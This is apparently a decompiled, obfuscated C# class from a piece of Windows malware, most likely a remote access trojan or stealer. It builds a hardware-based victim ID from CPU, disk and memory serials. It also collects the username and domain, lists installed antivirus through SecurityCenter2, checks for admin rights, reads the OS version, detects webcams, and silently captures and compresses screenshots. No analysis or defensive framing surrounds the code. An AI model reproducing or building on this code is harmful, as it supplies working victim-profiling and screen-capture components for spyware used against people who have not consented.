using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Windows.Forms;

// Token: 0x0200000B RID: 11
internal static class Class4
{
	// Token: 0x0600002B RID: 43 RVA: 0x00007D6C File Offset: 0x00005F6C
	internal static string smethod_0()
	{
		if (Class4.string_0 == null)
		{
			string str = "";
			str += Class4.smethod_1("Win32_Processor", "ProcessorId");
			str += Class4.smethod_1("Win32_DiskDrive", "SerialNumber");
			str += Class4.smethod_1("Win32_PhysicalMemory", "SerialNumber");
			try
			{
				str += Environment.UserDomainName;
				goto IL_09;
			}
			catch
			{
				goto IL_09;
			}
			goto IL_86;
			IL_09:
			try
			{
				str += Class4.d();
			}
			catch
			{
			}
			Class4.string_0 = GClass15.smethod_0(str).ToUpper();
		}
		IL_86:
		return Class4.string_0;
	}

	// Token: 0x0600002C RID: 44 RVA: 0x00007E20 File Offset: 0x00006020
	private static string smethod_1(string string_5, string string_6)
	{
		string result = "";
		try
		{
			using (ManagementClass managementClass = new ManagementClass(string_5))
			{
				using (ManagementObjectCollection instances = managementClass.GetInstances())
				{
					foreach (ManagementBaseObject managementBaseObject in instances)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							if ((result = (managementObject.GetPropertyValue(string_6) as string)) != "")
							{
								break;
							}
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x0600002D RID: 45 RVA: 0x00007EEC File Offset: 0x000060EC
	internal static string smethod_2()
	{
		try
		{
			if (Class4.string_1 == null)
			{
				Class4.string_1 = "N/A";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct"))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						List<string> list = new List<string>();
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							string text = ((ManagementObject)managementBaseObject)["displayName"].ToString();
							if (!string.IsNullOrEmpty(text) && !string.IsNullOrWhiteSpace(text))
							{
								list.Add(text);
							}
						}
						if (list.Count > 0)
						{
							Class4.string_1 = string.Join(", ", list);
						}
					}
				}
			}
		}
		catch
		{
		}
		return Class4.string_1;
	}

	// Token: 0x0600002E RID: 46 RVA: 0x00007FF0 File Offset: 0x000061F0
	internal static string d()
	{
		if (Class4.string_2 == null)
		{
			for (;;)
			{
				try
				{
					Class4.string_2 = "N/A";
					Class4.string_2 = Environment.UserName;
					goto IL_09;
				}
				catch
				{
					goto IL_09;
				}
				break;
				IL_09:
				try
				{
					string userDomainName = Environment.UserDomainName;
					if (!userDomainName.smethod_0())
					{
						Class4.string_2 = Class4.string_2 + "[" + userDomainName + "]";
					}
					break;
				}
				catch
				{
					break;
				}
			}
		}
		return Class4.string_2;
	}

	// Token: 0x0600002F RID: 47 RVA: 0x00008070 File Offset: 0x00006270
	internal static string smethod_3()
	{
		try
		{
			using (WindowsIdentity current = WindowsIdentity.GetCurrent())
			{
				WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
				{
					return WindowsBuiltInRole.Administrator.ToString();
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
				{
					return WindowsBuiltInRole.User.ToString();
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
				{
					return WindowsBuiltInRole.Guest.ToString();
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.SystemOperator))
				{
					return WindowsBuiltInRole.SystemOperator.ToString();
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.AccountOperator))
				{
					return WindowsBuiltInRole.AccountOperator.ToString();
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.BackupOperator))
				{
					return WindowsBuiltInRole.BackupOperator.ToString();
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.PowerUser))
				{
					return WindowsBuiltInRole.PowerUser.ToString();
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.PrintOperator))
				{
					return WindowsBuiltInRole.PrintOperator.ToString();
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Replicator))
				{
					return WindowsBuiltInRole.Replicator.ToString();
				}
			}
			goto IL_190;
		}
		catch
		{
			goto IL_190;
		}
		string result;
		return result;
		IL_190:
		return "Unknown";
	}

	// Token: 0x06000030 RID: 48 RVA: 0x00008248 File Offset: 0x00006448
	internal static bool smethod_4()
	{
		bool result;
		try
		{
			result = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}
		catch
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000031 RID: 49 RVA: 0x00008284 File Offset: 0x00006484
	internal static string smethod_5()
	{
		if (Class4.string_3 == null)
		{
			try
			{
				Class4.string_3 = "Unknown OS";
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
					{
						if (enumerator.MoveNext())
						{
							Class4.string_3 = ((ManagementObject)enumerator.Current)["Caption"].ToString();
						}
					}
				}
				if (!Class4.string_3.Contains("7"))
				{
					if (Class4.string_3.Contains("8.1"))
					{
						Class4.string_3 = "Windows 8.1";
					}
					else if (Class4.string_3.Contains("8"))
					{
						Class4.string_3 = "Windows 8";
					}
					else if (!Class4.string_3.Contains("10"))
					{
						if (Class4.string_3.Contains("11"))
						{
							Class4.string_3 = "Windows 11";
						}
						else if (!Class4.string_3.Contains("2012"))
						{
							if (Class4.string_3.Contains("2016"))
							{
								Class4.string_3 = "Windows Server 2016";
							}
							else if (!Class4.string_3.Contains("2019"))
							{
								if (Class4.string_3.Contains("2022"))
								{
									Class4.string_3 = "Windows Server 2022";
								}
							}
							else
							{
								Class4.string_3 = "Windows Server 2019";
							}
						}
						else
						{
							Class4.string_3 = "Windows Server 2012";
						}
					}
					else
					{
						Class4.string_3 = "Windows 10";
					}
				}
				else
				{
					Class4.string_3 = "Windows 7";
				}
				Class4.string_3 = string.Format("{0} {1}Bit", Class4.string_3, Environment.Is64BitOperatingSystem ? 64 : 32);
			}
			catch
			{
			}
		}
		return Class4.string_3;
	}

	// Token: 0x06000032 RID: 50 RVA: 0x000084A0 File Offset: 0x000066A0
	internal static bool smethod_6()
	{
		bool result;
		try
		{
			List<string> list = new List<string>();
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
			{
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					list.Add(managementBaseObject["Caption"].ToString());
				}
			}
			result = (list.Count > 0);
		}
		catch
		{
			return false;
		}
		return result;
	}

	// Token: 0x06000033 RID: 51 RVA: 0x00008548 File Offset: 0x00006748
	internal static string h()
	{
		try
		{
			if (Class4.string_4 == null)
			{
				Class4.string_4 = Process.GetCurrentProcess().MainModule.FileName;
			}
		}
		catch
		{
		}
		return Class4.string_4;
	}

	// Token: 0x06000034 RID: 52 RVA: 0x0000858C File Offset: 0x0000678C
	public static byte[] i(int a = 60)
	{
		byte[] result;
		try
		{
			Rectangle bounds = Screen.PrimaryScreen.Bounds;
			using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
			{
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
				}
				int width = 640;
				int height = 480;
				using (Bitmap bitmap2 = new Bitmap(640, 480))
				{
					using (Graphics graphics2 = Graphics.FromImage(bitmap2))
					{
						graphics2.InterpolationMode = InterpolationMode.HighQualityBicubic;
						graphics2.DrawImage(bitmap, 0, 0, width, height);
					}
					using (MemoryStream memoryStream = new MemoryStream())
					{
						EncoderParameters encoderParameters = new EncoderParameters(1);
						encoderParameters.Param[0] = new EncoderParameter(Encoder.Quality, (long)a);
						ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
						Predicate<ImageCodecInfo> match;
						if ((match = Class4.__c.predicate_0) == null)
						{
							match = (Class4.__c.predicate_0 = new Predicate<ImageCodecInfo>(Class4.__c.__c_0.method_0));
						}
						ImageCodecInfo imageCodecInfo = Array.Find<ImageCodecInfo>(imageDecoders, match);
						if (imageCodecInfo == null)
						{
							bitmap2.Save(memoryStream, ImageFormat.Jpeg);
						}
						else
						{
							bitmap2.Save(memoryStream, imageCodecInfo, encoderParameters);
						}
						result = memoryStream.ToArray();
					}
				}
			}
		}
		catch
		{
			result = null;
		}
		return result;
	}

	// Token: 0x06000035 RID: 53 RVA: 0x00002308 File Offset: 0x00000508
	// Note: this type is marked as 'beforefieldinit'.
	static Class4()
	{
		Class16.kLjw4iIsCLsZtxc4lksN0j();
	}

	// Token: 0x06000036 RID: 54 RVA: 0x0000237B File Offset: 0x0000057B
	internal static bool smethod_7()
	{
		return Class4.object_0 == null;
	}

	// Token: 0x0400001A RID: 26
	private static string string_0;

	// Token: 0x0400001B RID: 27
	private static string string_1;

	// Token: 0x0400001C RID: 28
	private static string string_2;

	// Token: 0x0400001D RID: 29
	private static string string_3;

	// Token: 0x0400001E RID: 30
	private static string string_4;

	// Token: 0x0400001F RID: 31
	internal static object object_0;

	// Compiler-generated singleton class (originally <>c)
	[CompilerGenerated]
	private sealed class __c
	{
		public static readonly Class4.__c __c_0 = new Class4.__c();
		public static Predicate<ImageCodecInfo> predicate_0;

		internal bool method_0(ImageCodecInfo imageCodecInfo_0)
		{
			return imageCodecInfo_0.MimeType == "image/jpeg";
		}
	}
}
